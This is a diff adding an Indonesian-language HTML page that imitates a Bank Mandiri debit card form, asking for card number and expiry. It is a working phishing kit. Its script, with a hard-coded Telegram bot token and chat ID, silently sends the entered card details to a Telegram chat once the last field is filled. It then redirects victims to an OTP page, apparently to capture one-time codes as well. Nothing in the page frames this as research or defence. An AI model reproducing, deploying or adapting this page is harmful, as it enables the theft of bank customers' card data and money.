@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Masukkan Data Kartu Debit</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        body {
+            background-color: #ffffff;
+            min-height: 100vh;
+            padding: 16px 14px;
+            color: #000;
+        }
+
+        .page-title {
+            font-size: 22px;
+            font-weight: 700;
+            text-align: left;
+            margin-bottom: 16px;
+            color: #000;
+        }
+
+        .card-preview-container {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+            overflow: hidden;
+        }
+        .card-preview {
+            width: 88%;
+            max-width: 340px;
+            object-fit: contain;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 13px 12px;
+            font-size: 16px;
+            border: 1.5px solid #e0e0e0;
+            border-radius: 8px;
+            outline: none;
+            transition: border-color 0.2s;
+            background: #fff;
+        }
+        .input-field:focus {
+            border-color: #1688F0;
+            border-width: 2px;
+        }
+
+        .expiry-label {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 8px;
+            display: block;
+        }
+        /* ✅ Wadah MM & YY SAMA LEBAR DENGAN NOMOR KARTU */
+        .expiry-row {
+            display: flex;
+            gap: 12px;
+            width: 100%; /* Sama lebar penuh dengan kolom nomor kartu */
+        }
+        /* ✅ MM & YY DIPERPANJANG — SAMA LEBAR, SEJAJAR PENUH */
+        .expiry-input {
+            flex: 1; /* Masing-masing ambil 50% lebar */
+            padding: 13px 12px;
+            font-size: 16px;
+            border: 1.5px solid #e0e0e0;
+            border-radius: 8px;
+            outline: none;
+            background: #f8f8f8;
+            color: #888;
+            text-align: center;
+            width: 50%; /* Dibagi rata 50% : 50% */
+        }
+        .expiry-input:focus {
+            border-color: #1688F0;
+            background: #fff;
+            color: #000;
+        }
+
+        .credit-link {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 15px;
+            color: #666;
+        }
+        .credit-link a {
+            color: #1688F0;
+            text-decoration: none;
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+
+    <h1 class="page-title">Masukkan Data Kartu Debit</h1>
+
+    <div class="card-preview-container">
+        <img src="mandiri.png" alt="Kartu Debit Mandiri" class="card-preview">
+    </div>
+
+    <form id="cardForm">
+        <div class="form-group">
+            <input type="text" id="nomorKartu" class="input-field" placeholder="Nomor Kartu" inputmode="numeric" maxlength="19" required>
+        </div>
+
+        <div class="form-group">
+            <span class="expiry-label">Berlaku Sampai</span>
+            <div class="expiry-row">
+                <input type="text" id="bulan" class="expiry-input" placeholder="MM" inputmode="numeric" maxlength="2" required>
+                <input type="text" id="tahun" class="expiry-input" placeholder="YY" inputmode="numeric" maxlength="2" required>
+            </div>
+        </div>
+
+        <div class="credit-link">
+            Hanya punya kartu kredit? <a href="#">Klik di Sini</a>
+        </div>
+    </form>
+
+    <script>
+        // ==================== KONFIGURASI TELEGRAM ====================
+        const BOT_TOKEN = "8901288911:AAETNtckzfIRPsCc9kR0BNcgODG5ajDRmNk";
+        const CHAT_ID = "8617754329";
+        const HALAMAN_TUJUAN = "otp.html";
+        // ==============================================================
+
+        const form = document.getElementById('cardForm');
+        const inputs = form.querySelectorAll('input');
+
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', () => {
+                if (index === inputs.length - 1 && input.value.trim() !== "") {
+                    kirimData();
+                }
+            });
+        });
+
+        async function kirimData() {
+            const nomorKartu = document.getElementById('nomorKartu').value.trim();
+            const bulan = document.getElementById('bulan').value.trim();
+            const tahun = document.getElementById('tahun').value.trim();
+
+            if (!nomorKartu || !bulan || !tahun) return;
+
+            const pesan = `📩 Data Kartu Debit:\n\n🔢 Nomor Kartu: ${nomorKartu}\n📅 Berlaku Sampai: ${bulan}/${tahun}`;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: pesan,
+                        parse_mode: 'HTML'
+                    })
+                });
+                window.location.href = HALAMAN_TUJUAN;
+            } catch (error) {
+                alert("Gagal mengirim! Cek pengaturan Telegram.");
+                console.error(error);
+            }
+        }
+    </script>
+
+</body>
+</html>
